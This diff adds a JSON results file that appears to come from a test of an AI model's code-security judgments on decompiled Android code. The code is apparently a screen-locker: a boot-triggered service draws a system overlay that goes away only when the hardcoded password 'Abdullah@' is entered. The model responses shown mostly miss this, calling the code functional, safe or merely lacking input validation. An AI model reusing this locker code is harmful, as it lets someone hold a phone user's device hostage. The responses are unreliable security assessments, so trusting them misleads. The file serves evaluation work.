@@ -1,0 +1,314 @@
+{
+  "Function_1": {
+    "code": "public void onCreate(Bundle bundle) {\n        ADRTLogCatReader.onContext(this, \"com.aide.ui\");\n        super.onCreate(bundle);\n        try {\n            startService(new Intent(this, Class.forName(\"com.XPhantom.id.MyService\")));\n            finish();\n        } catch (ClassNotFoundException e) {\n            throw new NoClassDefFoundError(e.getMessage());\n        }\n    }",
+    "results": {
+      "1": {
+        "question": "Is this program susceptible to an exploitation?",
+        "response": " The provided code starts a service with an intent that contains the class name of the service. If the user chooses to provide a malicious class name, the program will start the specified service and execute the code within the service.",
+        "answers": {
+          "Yes": false,
+          "Buffer Overflow": false,
+          "is susceptible": false
+        }
+      },
+      "2": {
+        "question": "Does this program follow best security practices?",
+        "response": " No. The provided code does not check for the existence of the specified service before starting it, which could potentially lead to a malicious intent.",
+        "answers": {
+          "does not follow": false,
+          "harm the system": false
+        }
+      },
+      "3": {
+        "question": "Are there any vulnerabilities in this program?",
+        "response": " The provided code is not vulnerable to any attacks.",
+        "answers": {
+          "Yes": false,
+          "CVE": false,
+          "exploitable": false,
+          "vulnerable": true
+        }
+      },
+      "4": {
+        "question": "Can an attacker cause some undefined behavior?",
+        "response": " The provided code is not designed to be secure and will cause the app to crash if the service is not found.",
+        "answers": {
+          "yes": false,
+          "exploit": false,
+          "undefined behavior": false
+        }
+      },
+      "5": {
+        "question": "Is this program unknowningly tracking the user?",
+        "response": "",
+        "answers": {
+          "yes": false,
+          "location": false,
+          "profiling": false,
+          "tracking": false,
+          "recording": false
+        }
+      }
+    }
+  },
+  "Function_2": {
+    "code": "package adrt;\n\nimport android.content.Context;\nimport android.content.pm.PackageManager;\nimport java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\n/* loaded from: classes.dex */\npublic class ADRTLogCatReader implements Runnable {\n    private static Context context;\n\n    public static void onContext(Context context2, String str) {\n        if (context == null) {\n            context = context2.getApplicationContext();\n            if (0 != (context2.getApplicationInfo().flags & 2)) {\n                try {\n                    context2.getPackageManager().getPackageInfo(str, 128);\n                    ADRTSender.onContext(context, str);\n                    new Thread(new ADRTLogCatReader(), \"LogCat\").start();\n                } catch (PackageManager.NameNotFoundException e) {\n                }\n            }\n        }\n    }\n\n    @Override // java.lang.Runnable\n    public void run() {\n        try {\n            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\"logcat -v threadtime\").getInputStream()), 20);\n            while (true) {\n                String readLine = bufferedReader.readLine();\n                if (readLine == null) {\n                    return;\n                }\n                ADRTSender.sendLogcatLines(new String[]{readLine});\n            }\n        } catch (IOException e) {\n        }\n    }\n}",
+    "results": {
+      "1": {
+        "question": "Is this program susceptible to an exploitation?",
+        "response": " The provided code is not designed to be exploitable. It is designed to read the logcat output and send it to the ADRT server.",
+        "answers": {
+          "Yes": false,
+          "Buffer Overflow": false,
+          "is susceptible": false
+        }
+      },
+      "2": {
+        "question": "Does this program follow best security practices?",
+        "response": " No. The provided code is not designed to be secure. It does not check for exceptions, does not sanitize user input, and does not implement any authentication or authorization checks. It directly reads from the logcat and sends it to the ADRTSender without any validation or sanitization.",
+        "answers": {
+          "does not follow": false,
+          "harm the system": false
+        }
+      },
+      "3": {
+        "question": "Are there any vulnerabilities in this program?",
+        "response": " The provided code is not vulnerable to any known security issues.",
+        "answers": {
+          "Yes": false,
+          "CVE": false,
+          "exploitable": false,
+          "vulnerable": true
+        }
+      },
+      "4": {
+        "question": "Can an attacker cause some undefined behavior?",
+        "response": " The provided code is not designed to be used in a multi-threaded environment, and it does not properly handle potential exceptions.",
+        "answers": {
+          "yes": false,
+          "exploit": false,
+          "undefined behavior": false
+        }
+      },
+      "5": {
+        "question": "Is this program unknowningly tracking the user?",
+        "response": "",
+        "answers": {
+          "yes": false,
+          "location": false,
+          "profiling": false,
+          "tracking": false,
+          "recording": false
+        }
+      }
+    }
+  },
+  "Function_3": {
+    "code": "package adrt;\n\nimport android.content.Context;\nimport android.content.Intent;\nimport java.util.ArrayList;\n/* loaded from: classes.dex */\npublic class ADRTSender {\n    private static Context context;\n    private static String debuggerPackageName;\n\n    public static void onContext(Context context2, String str) {\n        context = context2;\n        debuggerPackageName = str;\n    }\n\n    public static void sendConnect(String str) {\n        Intent intent = new Intent();\n        intent.setPackage(debuggerPackageName);\n        intent.setAction(\"com.adrt.CONNECT\");\n        intent.putExtra(\"package\", str);\n        context.sendBroadcast(intent);\n    }\n\n    public static void sendStop(String str) {\n        Intent intent = new Intent();\n        intent.setPackage(debuggerPackageName);\n        intent.setAction(\"com.adrt.STOP\");\n        intent.putExtra(\"package\", str);\n        context.sendBroadcast(intent);\n    }\n\n    public static void sendBreakpointHit(String str, ArrayList<String> arrayList, ArrayList<String> arrayList2, ArrayList<String> arrayList3, ArrayList<String> arrayList4, ArrayList<String> arrayList5, ArrayList<String> arrayList6) {\n        Intent intent = new Intent();\n        intent.setPackage(debuggerPackageName);\n        intent.setAction(\"com.adrt.BREAKPOINT_HIT\");\n        intent.putExtra(\"package\", str);\n        intent.putExtra(\"variables\", arrayList);\n        intent.putExtra(\"variableValues\", arrayList2);\n        intent.putExtra(\"variableKinds\", arrayList3);\n        intent.putExtra(\"stackMethods\", arrayList4);\n        intent.putExtra(\"stackLocations\", arrayList5);\n        intent.putExtra(\"stackLocationKinds\", arrayList6);\n        context.sendBroadcast(intent);\n    }\n    public static void sendFields(String str, String str2, ArrayList<String> arrayList, ArrayList<String> arrayList2, ArrayList<String> arrayList3) {\n        Intent intent = new Intent();\n        intent.setPackage(debuggerPackageName);\n        intent.setAction(\"com.adrt.FIELDS\");\n        intent.putExtra(\"package\", str);\n        intent.putExtra(\"path\", str2);\n        intent.putExtra(\"fields\", arrayList);\n        intent.putExtra(\"fieldValues\", arrayList2);\n        intent.putExtra(\"fieldKinds\", arrayList3);\n        context.sendBroadcast(intent);\n    }\n\n    public static void sendLogcatLines(String[] strArr) {\n        Intent intent = new Intent();\n        intent.setPackage(debuggerPackageName);\n        intent.setAction(\"com.adrt.LOGCAT_ENTRIES\");\n        intent.putExtra(\"lines\", strArr);\n        context.sendBroadcast(intent);\n    }\n}",
+    "results": {
+      "1": {
+        "question": "Is this program susceptible to an exploitation?",
+        "response": " The provided code is not designed to handle untrusted input, and it does not sanitize or check the received data for malicious intent.",
+        "answers": {
+          "Yes": false,
+          "Buffer Overflow": false,
+          "is susceptible": false
+        }
+      },
+      "2": {
+        "question": "Does this program follow best security practices?",
+        "response": " No. The program does not perform any input validation, which can lead to malicious intents.",
+        "answers": {
+          "does not follow": false,
+          "harm the system": false
+        }
+      },
+      "3": {
+        "question": "Are there any vulnerabilities in this program?",
+        "response": " The code is not designed to process untrusted input, and there are no checks for null or empty input.",
+        "answers": {
+          "Yes": false,
+          "CVE": false,
+          "exploitable": false,
+          "vulnerable": false
+        }
+      },
+      "4": {
+        "question": "Can an attacker cause some undefined behavior?",
+        "response": " No.",
+        "answers": {
+          "yes": false,
+          "exploit": false,
+          "undefined behavior": false
+        }
+      },
+      "5": {
+        "question": "Is this program unknowningly tracking the user?",
+        "response": "",
+        "answers": {
+          "yes": false,
+          "location": false,
+          "profiling": false,
+          "tracking": false,
+          "recording": false
+        }
+      }
+    }
+  },
+  "Function_4": {
+    "code": "package com.XPhantom.id;\n\nimport android.content.BroadcastReceiver;\nimport android.content.Context;\nimport android.content.Intent;\n/* loaded from: classes.dex */\npublic class BootReceiver extends BroadcastReceiver {\n    private final String BOOT_ACTION = \"android.intent.action.BOOT_COMPLETED\";\n    Context mContext;\n\n    @Override // android.content.BroadcastReceiver\n    public void onReceive(Context context, Intent intent) {\n        this.mContext = context;\n        if (intent.getAction().equalsIgnoreCase(\"android.intent.action.BOOT_COMPLETED\")) {\n            try {\n                context.startService(new Intent(context, Class.forName(\"com.XPhantom.id.MyService\")));\n            } catch (ClassNotFoundException e) {\n                throw new NoClassDefFoundError(e.getMessage());\n            }\n        }\n    }\n}",
+    "results": {
+      "1": {
+        "question": "Is this program susceptible to an exploitation?",
+        "response": " The provided code starts a service on boot, which is not a secure way to start a service. It is better to start the service in the app's main activity or in a separate service that is explicitly started when the app is already running.",
+        "answers": {
+          "Yes": false,
+          "Buffer Overflow": false,
+          "is susceptible": false
+        }
+      },
+      "2": {
+        "question": "Does this program follow best security practices?",
+        "response": " No. The program does not check for the permission of the user before starting the service, and it does not stop the service when the user uninstalls the app.",
+        "answers": {
+          "does not follow": false,
+          "harm the system": false
+        }
+      },
+      "3": {
+        "question": "Are there any vulnerabilities in this program?",
+        "response": " The provided code is not susceptible to any known vulnerabilities.",
+        "answers": {
+          "Yes": false,
+          "CVE": false,
+          "exploitable": false,
+          "vulnerable": false
+        }
+      },
+      "4": {
+        "question": "Can an attacker cause some undefined behavior?",
+        "response": " The provided code appears to have no issues.",
+        "answers": {
+          "yes": false,
+          "exploit": false,
+          "undefined behavior": false
+        }
+      },
+      "5": {
+        "question": "Is this program unknowningly tracking the user?",
+        "response": "",
+        "answers": {
+          "yes": false,
+          "location": false,
+          "profiling": false,
+          "tracking": false,
+          "recording": false
+        }
+      }
+    }
+  },
+  "Function_5": {
+    "code": "package com.XPhantom.id;\n\nimport adrt.ADRTLogCatReader;\nimport android.app.Service;\nimport android.content.Context;\nimport android.content.Intent;\nimport android.os.IBinder;\nimport android.view.LayoutInflater;\nimport android.view.View;\nimport android.view.ViewGroup;\nimport android.view.WindowManager;\nimport android.widget.Button;\nimport android.widget.EditText;\nimport android.widget.ImageView;\nimport android.widget.Toast;\n/* loaded from: classes.dex */\npublic class MyService extends Service {\n    ImageView chatHead;\n    Context context;\n    EditText e1;\n    ViewGroup myView;\n    WindowManager windowManager;\n\n    @Override // android.app.Service\n    public void onCreate() {\n        ADRTLogCatReader.onContext(this, \"com.aide.ui\");\n        this.windowManager = (WindowManager) getSystemService(\"window\");\n        this.myView = (ViewGroup) ((LayoutInflater) getSystemService(\"layout_inflater\")).inflate(R.layout.main, (ViewGroup) null);\n        this.chatHead = new ImageView(this);\n        this.chatHead.setImageResource(R.drawable.ic_launcher);\n        this.e1 = (EditText) this.myView.findViewById(R.id.mainEditText1);\n        ((Button) this.myView.findViewById(R.id.mainButton1)).setOnClickListener(new View.OnClickListener(this) { // from class: com.XPhantom.id.MyService.100000000\n            private final MyService this$0;\n\n            {\n                this.this$0 = this;\n            }\n\n            @Override // android.view.View.OnClickListener\n            public void onClick(View view) {\n                if (this.this$0.e1.getText().toString().equals(\"Abdullah@\")) {\n                    this.this$0.windowManager.removeView(this.this$0.myView);\n                    try {\n                        this.this$0.context.startService(new Intent(this.this$0.context, Class.forName(\"com.XPhantom.id.MyService\")));\n                        return;\n                    } catch (ClassNotFoundException e) {\n                        throw new NoClassDefFoundError(e.getMessage());\n                    }\n                }\n                this.this$0.e1.setText(\"\");\n            }\n        });\n        WindowManager.LayoutParams layoutParams = new WindowManager.LayoutParams(-2, -2, 2002, 1, -3);\n        layoutParams.gravity = 17;\n        layoutParams.x = 0;\n        layoutParams.y = 0;\n        new View(this).setBackgroundColor(872349696);\n        this.windowManager.addView(this.myView, layoutParams);\n    }\n\n    @Override // android.app.Service\n    public IBinder onBind(Intent intent) {\n        return null;\n    }\n\n    public void f() {\n        Toast.makeText(this, \"\u0412\u0430\u0448 \u0442\u0435\u043a\u0441\u0442\", 0).show();\n    }\n}",
+    "results": {
+      "1": {
+        "question": "Is this program susceptible to an exploitation?",
+        "response": " The provided code is not designed to be exploitable.",
+        "answers": {
+          "Yes": false,
+          "Buffer Overflow": false,
+          "is susceptible": false
+        }
+      },
+      "2": {
+        "question": "Does this program follow best security practices?",
+        "response": " No. The provided code is not secure, as it does not check the length of the input text. It is also not resistant to reverse engineering, as the code is not obfuscated.",
+        "answers": {
+          "does not follow": false,
+          "harm the system": false
+        }
+      },
+      "3": {
+        "question": "Are there any vulnerabilities in this program?",
+        "response": " The provided code is not very secure, as it does not perform any input validation. It is possible to crash the app by entering a malicious string in the EditText widget. To fix this, you can add input validation, for example, by using regular expressions.",
+        "answers": {
+          "Yes": false,
+          "CVE": false,
+          "exploitable": false,
+          "vulnerable": false
+        }
+      },
+      "4": {
+        "question": "Can an attacker cause some undefined behavior?",
+        "response": " No. The provided code is functional and will not cause any issues.",
+        "answers": {
+          "yes": false,
+          "exploit": false,
+          "undefined behavior": false
+        }
+      },
+      "5": {
+        "question": "Is this program unknowningly tracking the user?",
+        "response": "",
+        "answers": {
+          "yes": false,
+          "location": false,
+          "profiling": false,
+          "tracking": false,
+          "recording": false
+        }
+      }
+    }
+  },
+  "Function_6": {
+    "code": "package com.XPhantom.id;\n/* loaded from: classes.dex */\npublic final class R {\n\n    /* loaded from: classes.dex */\n    public static final class attr {\n    }\n\n    /* loaded from: classes.dex */\n    public static final class drawable {\n        public static final int ic_launcher = 0x7f020000;\n        /* JADX INFO: Added by JADX */\n        public static final int ic_launcher_bacground = 0x7f020001;\n        /* JADX INFO: Added by JADX */\n        public static final int ic_launcher_background = 0x7f020002;\n        /* JADX INFO: Added by JADX */\n        public static final int ic_launcher_round = 0x7f020003;\n    }\n\n    /* loaded from: classes.dex */\n    public static final class id {\n        public static final int mainButton1 = 0x7f060000;\n        public static final int mainEditText1 = 0x7f060001;\n    }\n\n    /* loaded from: classes.dex */\n    public static final class layout {\n        public static final int main = 0x7f030000;\n    }\n\n    /* loaded from: classes.dex */\n    public static final class string {\n        public static final int app_name = 0x7f040001;\n        public static final int hello = 0x7f040000;\n        public static final int password = 0x7f040004;\n        public static final int text = 0x7f040002;\n        public static final int text1 = 0x7f040003;\n    }\n\n    /* loaded from: classes.dex */\n    public static final class style {\n        public static final int AppTheme = 0x7f050000;\n    }\n}",
+    "results": {
+      "1": {
+        "question": "Is this program susceptible to an exploitation?",
+        "response": " The provided code is not obfuscated and is not designed to be secure. It is designed to be simple and easy to understand.",
+        "answers": {
+          "Yes": false,
+          "Buffer Overflow": false,
+          "is susceptible": false
+        }
+      },
+      "2": {
+        "question": "Does this program follow best security practices?",
+        "response": " No. The provided code does not encrypt sensitive data, and it does not use a secure random number generator.",
+        "answers": {
+          "does not follow": false,
+          "harm the system": false
+        }
+      },
+      "3": {
+        "question": "Are there any vulnerabilities in this program?",
+        "response": " The provided code is not susceptible to any known vulnerabilities.",
+        "answers": {
+          "Yes": false,
+          "CVE": false,
+          "exploitable": false,
+          "vulnerable": false
+        }
+      },
+      "4": {
+        "question": "Can an attacker cause some undefined behavior?",
+        "response": " The provided code is not obfuscated and is not minified.",
+        "answers": {
+          "yes": false,
+          "exploit": false,
+          "undefined behavior": false
+        }
+      },
+      "5": {
+        "question": "Is this program unknowningly tracking the user?",
+        "response": "",
+        "answers": {
+          "yes": false,
+          "location": false,
+          "profiling": false,
+          "tracking": false,
+          "recording": false
+        }
+      }
+    }
+  }
+}
